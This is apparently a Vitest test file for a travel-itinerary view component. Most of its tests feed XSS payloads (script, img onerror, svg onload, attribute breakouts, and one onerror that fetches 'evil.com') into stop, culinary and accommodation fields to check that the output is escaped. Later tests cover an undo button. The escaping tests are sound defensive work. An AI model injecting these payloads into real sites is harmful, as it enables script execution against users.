import { describe, it, expect, vi, beforeEach } from 'vitest'
import type { Stop, CulinaryRegion, Accommodation, Itinerary } from '../types'
import { ItineraryView } from './ItineraryView'

// Mock IntersectionObserver which is not available in test environment
global.IntersectionObserver = class IntersectionObserver {
  constructor() {}
  disconnect() {}
  observe() {}
  unobserve() {}
  takeRecords() {
    return []
  }
} as any

describe('ItineraryView XSS Prevention', () => {
  let view: ItineraryView
  let container: HTMLDivElement

  beforeEach(() => {
    document.body.innerHTML = `
      <div id="route-summary"></div>
      <div id="filter-chips"></div>
      <div id="selected-stop"></div>
      <div id="timeline"></div>
      <div id="cul-grid"></div>
      <div id="accom-tbody"></div>
      <div id="itinerary"></div>
    `
    container = document.body

    view = new ItineraryView(
      vi.fn(),
      vi.fn(),
    )
  })

  it('escapes malicious stop destinations in timeline', () => {
    const stops: Stop[] = [
      {
        id: 1,
        days: '1',
        dates: '2026-06-10',
        dest: '<img src=x onerror=alert(1)>',
        region: '<script>alert("XSS")</script>',
        coords: [0, 0] as [number, number],
        tags: [],
        nights: 1,
        desc: 'Normal description',
        highlights: [],
        from: 'Amsterdam',
        km: 100,
        time: '2h',
        zoom: 12,
        pitch: 45,
        bearing: 0,
      },
    ]

    view.render(stops, [], [])

    const timeline = document.getElementById('timeline')
    expect(timeline?.innerHTML).not.toContain('<img src=x')
    expect(timeline?.innerHTML).not.toContain('<script>')
    expect(timeline?.innerHTML).toContain('&lt;img')
    expect(timeline?.innerHTML).toContain('&lt;script&gt;')
  })

  it('escapes malicious highlights in timeline', () => {
    const stops: Stop[] = [
      {
        id: 1,
        days: '1',
        dates: '2026-06-10',
        dest: 'Stockholm',
        region: 'Upland',
        coords: [18.1, 59.3] as [number, number],
        tags: [],
        nights: 1,
        desc: 'Safe description',
        highlights: [
          'Visit the castle',
          '"><script>alert(1)</script><span x="',
          '<img src=x onerror="fetch(\'https://evil.com\')">"',
        ],
        from: 'Amsterdam',
        km: 100,
        time: '2h',
        zoom: 12,
        pitch: 45,
        bearing: 0,
      },
    ]

    view.render(stops, [], [])

    const timeline = document.getElementById('timeline')
    const highlights = timeline?.querySelectorAll('.card-highlights li')
    expect(highlights?.length).toBe(3)
    expect(highlights?.[1]?.innerHTML).not.toContain('<script>')
    expect(highlights?.[1]?.innerHTML).toContain('&lt;script&gt;')
    expect(highlights?.[2]?.innerHTML).not.toContain('<img')
    expect(highlights?.[2]?.innerHTML).toContain('&lt;img')
  })

  it('escapes malicious culinary descriptions', () => {
    const stops: Stop[] = [
      {
        id: 1,
        days: '1',
        dates: '2026-06-10',
        dest: 'Stockholm',
        region: 'Upland',
        coords: [18.1, 59.3] as [number, number],
        tags: [],
        nights: 1,
        desc: 'Safe',
        highlights: [],
        from: 'Amsterdam',
        km: 100,
        time: '2h',
        zoom: 12,
        pitch: 45,
        bearing: 0,
      },
    ]

    const culinary: CulinaryRegion[] = [
      {
        icon: '🍴',
        name: '<img src=x onerror=alert(1)>',
        region: 'Scania">alert(1)</div><div x="',
        desc: '<script>alert("food XSS")</script>',
        must: ['Meatballs', '"><script>alert(1)</script>'],
        color: 'rgb(0,0,0)',
      },
    ]

    view.render(stops, culinary, [])

    const grid = document.getElementById('cul-grid')
    expect(grid?.innerHTML).not.toContain('<img src=x')
    expect(grid?.innerHTML).not.toContain('<script>')
    expect(grid?.innerHTML).toContain('&lt;img')
    expect(grid?.innerHTML).toContain('&lt;script&gt;')

    const mustList = grid?.querySelector('.cul-list')
    expect(mustList?.innerHTML).not.toContain('<script>')
    expect(mustList?.innerHTML).toContain('&lt;script&gt;')
  })

  it('escapes malicious accommodation details', () => {
    const stops: Stop[] = [
      {
        id: 1,
        days: '1',
        dates: '2026-06-10',
        dest: 'Stockholm',
        region: 'Upland',
        coords: [18.1, 59.3] as [number, number],
        tags: [],
        nights: 1,
        desc: 'Safe',
        highlights: [],
        from: 'Amsterdam',
        km: 100,
        time: '2h',
        zoom: 12,
        pitch: 45,
        bearing: 0,
      },
    ]

    const accommodations: Accommodation[] = [
      {
        dest: '<img src=x onerror=alert(1)>',
        type: 'Hotel"><script>alert(1)</script>',
        policy: 'free',
        bath: true,
        terrace: false,
        note: '<svg onload=alert(1)>',
      },
    ]

    view.render(stops, [], accommodations)

    const tbody = document.getElementById('accom-tbody')
    const cells = tbody?.querySelectorAll('td')
    expect(tbody?.innerHTML).not.toContain('<img src=x')
    expect(tbody?.innerHTML).not.toContain('<script>')
    expect(tbody?.innerHTML).not.toContain('<svg')
    expect(tbody?.innerHTML).toContain('&lt;img')
    expect(tbody?.innerHTML).toContain('&lt;svg')
  })

  it('escapes malicious from city in route info', () => {
    const stops: Stop[] = [
      {
        id: 1,
        days: '1',
        dates: '2026-06-10',
        dest: 'Stockholm',
        region: 'Upland',
        coords: [18.1, 59.3] as [number, number],
        tags: [],
        nights: 1,
        desc: 'Safe',
        highlights: [],
        from: '"><script>alert(1)</script>',
        km: 100,
        time: '2h',
        zoom: 12,
        pitch: 45,
        bearing: 0,
      },
    ]

    view.render(stops, [], [])

    const timeline = document.getElementById('timeline')
    expect(timeline?.innerHTML).not.toContain('<script>')
    expect(timeline?.innerHTML).toContain('&lt;script&gt;')
  })

  it('renders XSS payload in tagLabel as inert text (Issue 1)', () => {
    const stops: Stop[] = [
      {
        id: 1,
        days: '1',
        dates: '2026-06-10',
        dest: 'Stockholm',
        region: 'Upland',
        coords: [18.1, 59.3] as [number, number],
        tags: ['"><img src=x onerror=alert(1)>'],
        nights: 1,
        desc: 'Safe',
        highlights: [],
        from: 'Amsterdam',
        km: 100,
        time: '2h',
        zoom: 12,
        pitch: 45,
        bearing: 0,
      },
    ]

    view.render(stops, [], [])

    const tspan = document.querySelector('.tags span')

    // Tag text should contain the payload but as plain text (not an executable img tag)
    expect(tspan?.textContent).toContain('img')
    expect(tspan?.textContent).toContain('onerror')
    // The textContent should NOT have been parsed as HTML - no child img elements
    expect(tspan?.querySelector('img')).toBeNull()

    // Tag in class attribute should be sanitized (only alphanumerics and hyphens)
    const classList = tspan?.className || ''
    expect(classList).toMatch(/^tag tag-[a-z0-9-]*$/)
  })

  it('escapes tag in data-tags attribute (Issue 3)', () => {
    const stops: Stop[] = [
      {
        id: 1,
        days: '1',
        dates: '2026-06-10',
        dest: 'Stockholm',
        region: 'Upland',
        coords: [18.1, 59.3] as [number, number],
        tags: ['nature', 'culture'],
        nights: 1,
        desc: 'Safe',
        highlights: [],
        from: 'Amsterdam',
        km: 100,
        time: '2h',
        zoom: 12,
        pitch: 45,
        bearing: 0,
      },
    ]

    view.render(stops, [], [])

    const timeline = document.getElementById('timeline')
    const tItem = timeline?.querySelector('.t-item')
    const dataTags = tItem?.getAttribute('data-tags') || ''

    // Verify that data-tags still contains the tags in the right format
    expect(dataTags).toContain('nature')
    expect(dataTags).toContain('culture')

    // Test filtering still works
    const mockFilterCallback = vi.fn()
    const view2 = new ItineraryView(mockFilterCallback, vi.fn())
    view2.render(stops, [], [])
    view2.setFilter('nature')

    // Verify filtering logic (reads from data-tags attribute)
    const visibleItems = timeline?.querySelectorAll('.t-item:not(.hidden)')
    expect(visibleItems?.length).toBeGreaterThan(0)
  })

  it('escapes XSS payload in tpl() parameters (Issue 2)', () => {
    const stops: Stop[] = [
      {
        id: 1,
        days: '1',
        dates: '2026-06-10',
        dest: '<script>alert("XSS")</script>',
        region: 'Upland',
        coords: [18.1, 59.3] as [number, number],
        tags: [],
        nights: 1,
        desc: 'Safe',
        highlights: [],
        from: '<img src=x onerror=alert(1)>',
        km: 500,
        time: '5h',
        zoom: 12,
        pitch: 45,
        bearing: 0,
      },
    ]

    view.render(stops, [], [])

    // Check route-summary for escaped longestDrive.dest in tpl() output
    const summary = document.getElementById('route-summary')
    expect(summary?.innerHTML).not.toContain('<script>')
    expect(summary?.innerHTML).toContain('&lt;script&gt;')
  })
})

describe('ItineraryView undo-last-edit button (#51)', () => {
  let onUndo: ReturnType<typeof vi.fn>

  function aValidItinerary(overrides: Partial<Itinerary> = {}): Itinerary {
    return {
      title: 'Roadtrip till Malmö',
      totalDays: 3,
      startCity: 'Malmö',
      endCity: 'Västra Götaland',
      generatedAt: '2026-06-01T00:00:00.000Z',
      stops: [
        {
          day: 1,
          city: 'Malmö',
          region: 'Skåne',
          lat: 55.605,
          lng: 13.0038,
          nights: 2,
          highlights: ['Gärdet'],
          accommodation: 'Hotel Malmö',
          culinaryNotes: 'Try the smörgåsbord',
        },
      ],
      ...overrides,
    }
  }

  const baselineStops: Stop[] = [
    {
      id: 1,
      days: '1',
      dates: '2026-06-10',
      dest: 'Malmö',
      region: 'Skåne',
      coords: [13.0038, 55.605] as [number, number],
      tags: [],
      nights: 1,
      desc: '',
      highlights: [],
      from: '',
      km: 0,
      time: '',
      zoom: 12,
      pitch: 45,
      bearing: 0,
    },
  ]

  beforeEach(() => {
    document.body.innerHTML = `
      <div id="route-summary"></div>
      <div id="filter-chips"></div>
      <div id="selected-stop"></div>
      <div id="timeline"></div>
      <div id="cul-grid"></div>
      <div id="accom-tbody"></div>
      <div id="itinerary"><div class="section-wrap"></div></div>
    `
    onUndo = vi.fn()
  })

  it('is hidden until the loaded itinerary has a previous version, then calls the undo callback on click', () => {
    const view = new ItineraryView(vi.fn(), vi.fn(), vi.fn(), vi.fn(), undefined, onUndo)
    view.render(baselineStops, [], [])

    const undoBtn = document.getElementById('btn-undo-last-edit') as HTMLButtonElement
    expect(undoBtn).toBeTruthy()
    expect(undoBtn.classList.contains('hidden')).toBe(true)

    view.renderFromItinerary(aValidItinerary({ hasPreviousVersion: true }))
    expect(undoBtn.classList.contains('hidden')).toBe(false)

    undoBtn.click()
    expect(onUndo).toHaveBeenCalledOnce()
  })

  it('hides again once hasPreviousVersion is false (e.g. after an undo)', () => {
    const view = new ItineraryView(vi.fn(), vi.fn(), vi.fn(), vi.fn(), undefined, onUndo)
    view.render(baselineStops, [], [])
    view.renderFromItinerary(aValidItinerary({ hasPreviousVersion: true }))

    const undoBtn = document.getElementById('btn-undo-last-edit') as HTMLButtonElement
    expect(undoBtn.classList.contains('hidden')).toBe(false)

    view.setHasPreviousVersion(false)
    expect(undoBtn.classList.contains('hidden')).toBe(true)
  })

  it('reflects hasPreviousVersion via setHasPreviousVersion without a full re-render', () => {
    const view = new ItineraryView(vi.fn(), vi.fn(), vi.fn(), vi.fn())
    view.render(baselineStops, [], [])
    view.renderFromItinerary(aValidItinerary({ hasPreviousVersion: false }))

    const undoBtn = document.getElementById('btn-undo-last-edit') as HTMLButtonElement
    expect(undoBtn.classList.contains('hidden')).toBe(true)

    view.setHasPreviousVersion(true)
    expect(undoBtn.classList.contains('hidden')).toBe(false)
  })
})
